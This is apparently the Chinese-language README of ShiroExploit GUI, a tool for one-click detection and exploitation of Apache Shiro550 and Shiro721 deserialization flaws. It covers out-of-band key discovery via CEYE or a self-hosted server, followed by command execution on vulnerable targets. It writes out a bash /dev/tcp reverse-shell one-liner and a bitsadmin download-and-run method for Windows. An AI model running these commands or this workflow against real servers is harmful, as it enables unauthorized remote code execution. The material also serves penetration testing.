# ShiroExploit GUI Version
支持对Shiro550（硬编码秘钥）和Shiro721（Padding Oracle）的一键化检测

## 使用说明 
### 第一步:按要求输入要检测的目标URL和选择漏洞类型
+ Shiro550无需提供rememberMe Cookie，Shiro721需要提供一个有效的rememberMe Cookie
![pic1](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic1.png)

### 第二步: 选择攻击方式
#### 选择 ```和CEYE配合使用```
+ 可以不进行任何配置，配置文件中已经预置了 CEYE 域名和对应的 Token，当然也可以对其进行修改。
+ 程序会首先使用 ```URLDNS``` 筛选出唯一 Key，然后依次调用各个 Gadget 生成 Payload 
+ 不支持 JRMP 的方式
+ 注意：程序会使用 API：http://api.ceye.io/v1/records?token=a78a1cb49d91fe09e01876078d1868b2&type=dns&filter=[UUID] 查询检测结果，这个 API 有时候会无法正常访问，导致在这种方式下无法找到 Key 或者有效的 Gadget
![pic2](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic2.png)

#### 选择 ```和自实现的OOB Service配合使用```
+ 如果选择```和自实现的OOB Service```配合使用，则需要在 VPS 上通过命令```java -cp ShiroExploit.jar com.shiroexploit.server.BasicHTTPServer [HttpSerivce Port] [JRMPListener Port]```开启OOB Service，并按照要求填入相应IP和端口
+ 如果开启OOB Service时未指定端口号，则HTTPService默认监听8080端口，JRMPListener默认监听8088端口
+ 支持 JRMP 的方式
+ ```使用第三方DNSLog平台筛选出唯一Key（可选）``` 支持采用人工干预的方式提前筛选出唯一有效的 Key，从而提升检测效率。此项也可以不进行配置，如若不配置，针对每个 Gadget，会调用所有的 Key 分别加密生成 Payload，影响检测效率。
![pic3](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic3.png)
![pic4](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic4.png)

### 第三步：检测漏洞并执行命令
+ 程序在判断目标应用是否存在漏洞时，窗口上部的输入框无法进行输入。当程序检测出目标应用存在漏洞时，输入框可以进行输入并执行命令。
+ ```反弹shell（linux）``` 采用 ```bash -i >& /dev/tcp/1.2.3.4/443 0>&1``` 的方式反弹 shell
+ ```反弹shell（Windows）``` 采用 bitsadmin 下载指定 URL 的 exe 文件并执行的方式获取 shell
![pic5](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic5.png)
![pic6](https://raw.githubusercontent.com/feihong-cs/ShiroExploit_GUI/master/imgForReadMe/pic6.png)

## 备注
在使用漏洞检测主程序或者使用OOBService时，均需要ysoserial.jar的支持，将ysoserial.jar和ShiroExploit.jar放置在同一目录即可。

## 致谢
感谢 [AgeloVito](https://github.com/AgeloVito) 给予的大量支持
